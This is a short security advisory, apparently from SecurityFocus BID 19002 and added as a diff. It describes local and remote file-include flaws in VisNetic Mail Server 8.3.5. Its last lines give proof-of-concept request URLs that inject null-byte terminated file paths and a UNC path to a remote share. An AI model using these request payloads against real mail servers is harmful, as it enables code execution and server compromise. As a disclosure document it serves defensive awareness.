@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/19002/info
+
+VisNetic Mail Server is prone to multiple local file-include vulnerabilities and a remote file includes vulnerability. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+An attacker can exploit these issues to include arbitrary remote files or local files containing malicious PHP code and execute it in the context of the web server process. This may allow the attacker to compromise the application and access the underlying system.
+
+Version 8.3.5 is vulnerable to this issue; prior versions may also be affected.
+
+http://www.example.com/mail/settings.html?id=[current_id]&Save_x=1&language=TEST http://www.example.com:32000/mail/index.html?id=[curent_id]&lang_settings[TEST]=test;&lang_settings[TEST]=test;c:\[file]%00; http://www.example.com/mail/index.html?id=[curent_id]&lang_settings[TEST]=test;&lang_settings[TEST]=test;\\[host]\[share]\[file]%00;
